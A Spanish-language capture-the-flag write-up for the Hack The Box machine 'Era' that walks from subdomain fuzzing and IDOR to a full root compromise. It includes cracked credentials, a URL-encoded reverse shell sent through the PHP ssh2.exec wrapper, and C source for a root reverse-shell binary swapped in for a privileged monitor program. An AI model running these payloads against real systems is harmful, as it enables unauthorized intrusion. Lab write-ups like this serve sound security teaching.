---
tags:
title: Era - Medium (HTB)
permalink: /Era-HTB-Writeup
toc: true
toc_label:
toc_sticky: true
sidebar: main
---
# Reconocimiento

```bash 
nmap -sCV -p21,80 10.10.11.79
```

![Pasted image 20250727003806](images/Pasted image 20250727003806.png)

Al visitar la pagina web por el puerto `80` vemos que no hay nada interesante por lo que pasamos a buscar por `subdominios`.

```bash 
wfuzz -c --hc=404,403,400 --hh=154 -H "Host: FUZZ.era.htb" -u http://era.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 150
```

![Pasted image 20250729041751](images/Pasted image 20250729041751.png)

Encontramos el subdominio `file`

```bash 
sudo tee "file.era.htb 10.10.11.79" > /etc/hosts
```

![Pasted image 20250729042111](images/Pasted image 20250729042111.png)

Vemos que en la seccion de `Upload Files` podemos subir un archivo y donde podemos ver su `id` por lo que podemos ver si es vulnerable a un `IDOR` con el `Intruder` de `Burpsuite`.

![Pasted image 20250729042242](images/Pasted image 20250729042242.png)

Vemos un archivo comprimido `zip`
![Pasted image 20250729042330](images/Pasted image 20250729042330.png)

```bash 
7z x site-backup-30-08-24.zip
```

Si lo descomprimimos podemos ver un archivo `filedb.sqlite`

```bash 
sqlite3 filedb.sqlite
```

```bash 
.tables 
```

```bash 
select * from users;
```

![Pasted image 20250729042648](images/Pasted image 20250729042648.png)

Vemos hashes para poder crackearlos con `johnTheRipper`. 
Como solo los hashes de `eric` y `yuri` son crackeables procedemos a hacerlo 


```bash 
john hashess --wordlist=/usr/share/wordlists/rockyou.txt
```

`eric:america`
`yuri:mustang`

![Pasted image 20250729042937](images/Pasted image 20250729042937.png)

Luego revisando el codigo vemos que en `download.php` vemos que el usuario `admin_ef01cab31aa` es vulnerable a `SSRF (Server-Side Request Forgery)` al ver que en la seccion de `Update Security Questions` con solo saber el nombre del usuario podemos setearle respuestas para luego en la ruta de `http://file.era.htb/security_login.php` poder loguearnos como el.
Luego podemos ver que en `download.php` podemos permormar un `SSRF` como mencione antes, abusando del parametro `format=`. Jugando con wrappers de `php` el cual si vemos en nuestro acceso por `FTP` con las credenciales `yuri:mustang` podemos ver en una carpeta binarios `.so` dentro de los cuales esta `ssh2.so` el cual no es uno que normalmente debe estar, lo cual nos hace pensar en que podemos usar `wrappers` para performar el ataque . 

Primero ganamos acceso como el `admin` de la web
![Pasted image 20250729044303](images/Pasted image 20250729044303.png)

Nos logueamos 

![Pasted image 20250729044434](images/Pasted image 20250729044434.png)

Y ahora tenemos que desde la `url` ejecuto esto:

```bash 
http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.4%2F4444%200%3E%261%22;
```

O otra opci칩n, desde nuestra consola con `curl`. 

```bash 
curl "http://file.era.htb/download.php?id=1184&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.4%2F4444%200%3E%261%22;" -H "Cookie: PHPSESSID=q43bce8jabcehpuanjm4qrtf05"
```

```bash 
script /dev/null -c bash 
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Una vez dentro de la shell migramos al usuario `eric` ya que tenemos sus credenciales.

```bash 
su eric
america
```

```bash 
cat /home/eric/user.txt
```

---

# Root Flag

Una vez dentro como el usuario `eric` vemos que en la ruta `/opt/AV/periodic-checks` hay un binario del cual el propietario es `root` osea que corre como un binario privilegiado, y los miembros del grupo `devs` puede editar, borrar o crear archivos en esa ruta, y si hacemos un `id` vemos que `eric` es parte de ese grupo, por lo que nuestro plan es reemplazar el binario con uno que creemos nosotros desde nuestro lado el cual nos entable un shell como `root`

Primero creamos el binario en `C`.

```bash 
nvim exploit.c 
```

Escribimos el siguiente contenido el cual se va a encargar de enviarnos una shell a nuestra maquina, desde la cual vamos a estar en escucha con `nc` por el puerto `1337`.

```c#
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.16.5/1337 0>&1", NULL);
    return 0;
}
```

Luego compilamos el binario con `gcc`, donde con la flag `-static` indica que incluimos todas las bibliotecas dentro del binario para que no dependa de las versiones del sistema.

```bash 
gcc -o monitor.dup exploit.c -static
```

Luego subimos el archivo final a la maquina mont치ndonos un servidor en `Python` y descarg치ndolo desde la misma con o `wget`.

```bash 
python3 -m http.server 80
```

Y en la maquina victima:

```bash 
wget http://10.10.x.x/monitor.dup
```

Una vez dentro de la maquina hacemos lo siguiente
Donde extraigo la secci칩n `.text_sig` del binario `original` para insertarlo en el `duplicado`, de lo contrario va a fallar.

```bash 
objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
objcopy --add-section .text_sig=sig monitor.dup
```

Para luego copiar nuestro binario `malicioso` al lugar del `original`. 

```bash 
cp monitor.dup /opt/AV/periodic-checks/monitor
```

Ya una vez hecho esto nos ponemos en escucha con `nc` por el puerto `1337`, para que una vez que root corra el binario nos de una shell como `root`.

```bash 
nc -nlvp 1337
```

![Pasted image 20250729051921](images/Pasted image 20250729051921.png)

```bash 
cat /root/root.txt
```

`~Happy Hacking.`

